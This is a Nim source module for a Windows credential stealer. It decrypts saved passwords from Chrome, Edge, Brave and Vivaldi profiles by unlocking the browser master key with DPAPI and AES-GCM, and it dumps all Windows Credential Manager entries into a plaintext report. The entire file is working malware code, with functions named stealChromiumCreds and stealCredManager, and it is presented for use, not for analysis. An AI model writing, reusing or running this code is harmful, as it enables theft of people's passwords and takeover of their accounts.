## Browser credential harvesting: Chromium browsers + Windows Credential Manager.
## Bundles sqlite3 amalgamation — no system library needed.

{.compile: "sqlite3.c".}

import winim/lean
import std/[os, json, base64, strutils]
import nimcrypto/[bcmode, rijndael]

# ── SQLite3 minimal C API ─────────────────────────────────────────────────────
proc sqlite3_open(filename: cstring; ppDb: ptr pointer): cint {.importc, cdecl.}
proc sqlite3_prepare_v2(db: pointer; zSql: cstring; nByte: cint;
    ppStmt: ptr pointer; pzTail: ptr cstring): cint {.importc, cdecl.}
proc sqlite3_step(stmt: pointer): cint {.importc, cdecl.}
proc sqlite3_column_text(stmt: pointer; col: cint): cstring {.importc, cdecl.}
proc sqlite3_column_blob(stmt: pointer; col: cint): pointer {.importc, cdecl.}
proc sqlite3_column_bytes(stmt: pointer; col: cint): cint {.importc, cdecl.}
proc sqlite3_finalize(stmt: pointer): cint {.importc, cdecl.}
proc sqlite3_close(db: pointer): cint {.importc, cdecl.}
const SQLITE_ROW = 100

# ── DPAPI ─────────────────────────────────────────────────────────────────────
type DataBlob {.pure.} = object
  cbData: DWORD
  pbData: ptr byte

proc CryptUnprotectData(pIn: ptr DataBlob; szDesc: LPWSTR; pEnt: ptr DataBlob;
    pvRes: pointer; pPrompt: pointer; dwFlags: DWORD;
    pOut: ptr DataBlob): WINBOOL {.importc, stdcall, dynlib: "crypt32".}

proc dpUnprotect(data: openArray[byte]): seq[byte] =
  if data.len == 0: return
  var inBlob = DataBlob(cbData: data.len.DWORD, pbData: unsafeAddr data[0])
  var outBlob: DataBlob
  if CryptUnprotectData(addr inBlob, nil, nil, nil, nil, 0, addr outBlob) == 0: return
  result = newSeq[byte](outBlob.cbData)
  if outBlob.cbData > 0:
    copyMem(addr result[0], outBlob.pbData, outBlob.cbData)
  discard LocalFree(cast[HLOCAL](outBlob.pbData))

# ── AES-256-GCM via nimcrypto ─────────────────────────────────────────────────
proc aesGcmDecrypt(key, nonce, ct: openArray[byte]): seq[byte] =
  ## Decrypt Chrome v80+ password blob (AES-256-GCM, 12-byte nonce, 16-byte tag).
  if key.len < 32 or nonce.len != 12 or ct.len < 16: return
  let plainLen = ct.len - 16
  if plainLen < 0: return
  result = newSeq[byte](plainLen)
  var ctx: GCM[aes256]
  ctx.init(key.toOpenArray(0, 31), nonce, [])
  if plainLen > 0:
    ctx.decrypt(ct.toOpenArray(0, plainLen - 1), result)
  let tag = ctx.getTag()
  ctx.clear()
  # Verify authentication tag
  var tagMatch = true
  for i in 0..<16:
    if tag[i] != ct[plainLen + i]:
      tagMatch = false; break
  if not tagMatch: result = @[]

# ── Chromium master key extraction ────────────────────────────────────────────
proc chromiumMasterKey(baseDir: string): seq[byte] =
  let lsPath = baseDir / "Local State"
  if not fileExists(lsPath): return
  try:
    let raw = readFile(lsPath)
    let j = parseJson(raw)
    let encB64 = j{"os_crypt"}{"encrypted_key"}.getStr("")
    if encB64 == "": return
    let decoded = decode(encB64)
    if decoded.len < 5: return
    let prefix = decoded[0..4]
    if prefix != "DPAPI": return
    let encBytes = cast[seq[byte]](decoded[5..^1])
    return dpUnprotect(encBytes)
  except: discard

# ── Chrome password blob decryption ──────────────────────────────────────────
proc decryptChromePw(enc: seq[byte]; aesKey: seq[byte]): string =
  if enc.len == 0: return ""
  if enc.len > 3 and enc[0] == byte('v') and enc[1] == byte('1') and
     (enc[2] == byte('0') or enc[2] == byte('1')):
    # Chrome v80+: "v10"/"v11" prefix + 12-byte nonce + ciphertext + 16-byte tag
    let payload = enc[3..^1]
    if payload.len < 28: return "" # 12 nonce + at least 1 byte + 16 tag minimum (but 0-byte plain is valid)
    let nonce = payload[0..11]
    let ct    = payload[12..^1]
    let plain = aesGcmDecrypt(aesKey, nonce, ct)
    return cast[string](plain)
  # Legacy: bare DPAPI blob
  let plain = dpUnprotect(enc)
  return cast[string](plain)

# ── Read logins from a Chromium SQLite database ───────────────────────────────
type BrowserCred = object
  source, target, username, password: string

proc readChromiumLogins(dbPath: string; aesKey: seq[byte]; browser: string): seq[BrowserCred] =
  let tmpPath = getTempDir() / "ld_" & $GetCurrentProcessId() & ".db"
  defer: (try: removeFile(tmpPath) except: discard)
  try: copyFile(dbPath, tmpPath) except: return
  var db: pointer
  if sqlite3_open(tmpPath, addr db) != 0: return
  defer: discard sqlite3_close(db)
  var stmt: pointer
  let sql = "SELECT origin_url,username_value,password_value FROM logins WHERE username_value!=''"
  if sqlite3_prepare_v2(db, sql, -1, addr stmt, nil) != 0: return
  defer: discard sqlite3_finalize(stmt)
  while sqlite3_step(stmt) == SQLITE_ROW:
    let url  = $(sqlite3_column_text(stmt, 0))
    let user = $(sqlite3_column_text(stmt, 1))
    let pwPtr  = sqlite3_column_blob(stmt, 2)
    let pwLen  = sqlite3_column_bytes(stmt, 2)
    var encPw: seq[byte]
    if pwPtr != nil and pwLen > 0:
      encPw = newSeq[byte](pwLen)
      copyMem(addr encPw[0], pwPtr, pwLen)
    let pw = decryptChromePw(encPw, aesKey)
    if pw != "":
      result.add BrowserCred(source: browser, target: url, username: user, password: pw)

# ── Enumerate Chromium profiles ───────────────────────────────────────────────
proc chromiumProfiles(baseDir: string): seq[string] =
  result = @["Default"]
  try:
    for kind, name in walkDir(baseDir, relative = true):
      if kind == pcDir and name.startsWith("Profile "):
        result.add name
  except: discard

# ── Steal Chromium browser credentials ───────────────────────────────────────
const chromiumBrowsers = [
  ("Chrome",  r"Google\Chrome\User Data"),
  ("Edge",    r"Microsoft\Edge\User Data"),
  ("Brave",   r"BraveSoftware\Brave-Browser\User Data"),
  ("Vivaldi", r"Vivaldi\User Data"),
]

proc stealChromiumCreds(): seq[BrowserCred] =
  var localApp = getEnv("LOCALAPPDATA")
  if localApp == "":
    let up = getEnv("USERPROFILE")
    if up != "": localApp = up / "AppData" / "Local"
    elif (let ad = getEnv("APPDATA"); ad != ""):
      localApp = parentDir(ad) / "Local"
  if localApp == "": return
  for (name, relPath) in chromiumBrowsers:
    let baseDir = localApp / relPath
    if not dirExists(baseDir): continue
    let aesKey = chromiumMasterKey(baseDir)
    for prof in chromiumProfiles(baseDir):
      let loginDB = baseDir / prof / "Login Data"
      if not fileExists(loginDB): continue
      result.add readChromiumLogins(loginDB, aesKey, name)

# ── Windows Credential Manager ────────────────────────────────────────────────
type WinCred {.pure.} = object
  Flags:              DWORD
  Type:               DWORD
  TargetName:         LPWSTR
  Comment:            LPWSTR
  LastWritten:        FILETIME
  CredentialBlobSize: DWORD
  CredentialBlob:     ptr byte
  Persist:            DWORD
  AttributeCount:     DWORD
  Attributes:         pointer
  TargetAlias:        LPWSTR
  UserName:           LPWSTR

proc CredEnumerateW(filter: LPWSTR; flags: DWORD; count: ptr DWORD;
    creds: ptr ptr ptr WinCred): WINBOOL {.importc, stdcall, dynlib: "advapi32".}
proc CredFree(buf: pointer): void {.importc, stdcall, dynlib: "advapi32".}

proc stealCredManager(): seq[BrowserCred] =
  var count: DWORD
  var pCreds: ptr ptr WinCred
  if CredEnumerateW(nil, 0, addr count, addr pCreds) == 0: return
  defer: CredFree(pCreds)
  let ptrs = cast[ptr UncheckedArray[ptr WinCred]](pCreds)
  for i in 0..<count.int:
    let c = ptrs[i]
    if c == nil or c.UserName == nil: continue
    let target = $(cast[WideCString](c.TargetName))
    let user   = $(cast[WideCString](c.UserName))
    var pw = ""
    if c.CredentialBlobSize > 0 and c.CredentialBlob != nil:
      let blobSize = c.CredentialBlobSize
      let blob16   = cast[ptr UncheckedArray[uint16]](c.CredentialBlob)
      let wlen     = blobSize div 2
      if wlen > 0:
        var ws = newSeq[uint16](wlen + 1)
        copyMem(addr ws[0], blob16, wlen * 2)
        pw = $(cast[WideCString](addr ws[0]))
        # Check if printable; if not, fall back to raw bytes
        var printable = true
        for ch in pw:
          if ord(ch) < 32 or ord(ch) > 126: printable = false; break
        if not printable:
          var raw = newSeq[byte](blobSize)
          copyMem(addr raw[0], c.CredentialBlob, blobSize)
          pw = cast[string](raw)
    result.add BrowserCred(source: "CredManager", target: target,
                            username: user, password: pw)

# ── Public entry point ────────────────────────────────────────────────────────
proc doBrowserCreds*(): string =
  var all: seq[BrowserCred]
  all.add stealChromiumCreds()
  all.add stealCredManager()
  if all.len == 0: return "no credentials found"
  var sb: string
  for c in all:
    sb.add "[" & c.source & "] " & c.target & "\n"
    sb.add "  user: " & c.username & "\n"
    sb.add "  pass: " & c.password & "\n\n"
  return sb
